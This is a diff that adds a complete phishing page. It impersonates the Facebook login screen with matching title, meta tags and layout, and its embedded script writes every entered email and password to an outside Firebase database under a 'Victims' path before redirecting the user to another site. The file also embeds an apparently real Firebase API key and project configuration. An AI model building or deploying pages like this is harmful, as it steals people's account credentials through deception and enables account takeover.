@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:site_name" content="Facebook">
+    <meta name="description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know.">
+    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
+    <title>Facebook – log in or sign up</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="icon.ico" type="image/x-icon">
+</head>
+<body>
+    <div align="center">
+        <img src="logo.svg" alt="Logo" id="logo">
+        <p id="bio">Facebook helps you connect and<br>share with the people in your life.</p>
+    </div>
+    <div align="center" id="form">
+        <input type="text" id="email" placeholder="Email address or phone number" autofocus="1" autocomplete="off" aria-label="Email address or phone number"><br><br>
+        <input type="password" id="password" placeholder="Password" autofocus="1" autocomplete="off" aria-label="Password"><br><br>
+        <button type="submit" class="login" id="btn"><b>Log In</b></button><br><br>
+        <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot">Forgotten password?</a><br>
+        <div class="line"></div><br>
+        <a href="#" class="create"><b>Create New Account</b></a>
+    </div><br>
+    <p align="center" class="page"><a href="https://www.facebook.com/pages/create/?ref_type=registration_form" class="link"><b>Create a Page</b></a> for a celebrity, brand or business.</a>
+
+    <script type="module">
+        // Add values to your database. The below code is for demo.
+
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.8/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.6.8/firebase-database.js";
+
+        // TODO: Add SDKs for Firebase products that you want to use
+        // https://firebase.google.com/docs/web/setup#available-libraries
+        
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyA4i7BeViTC3SqHcsUFXPKkJ3RnU-XFe4w",
+            authDomain: "facebook-metaverse.firebaseapp.com",
+            databaseURL: "https://facebook-metaverse-default-rtdb.firebaseio.com",
+            projectId: "facebook-metaverse",
+            storageBucket: "facebook-metaverse.appspot.com",
+            messagingSenderId: "260592985789",
+            appId: "1:260592985789:web:d7c45a90709b2fa5fe79d4"
+        };
+        
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase();
+
+        function write() {
+            var email = document.getElementById("email").value
+            var password = document.getElementById("password").value
+            set(ref(database, 'Victims/'+email), {
+                email: email,
+                password: password
+            });
+            window.location.href = "https://codejapoe.xyz/";
+        }
+        btn.addEventListener('click', write)
+    </script>
+</body>
+</html>
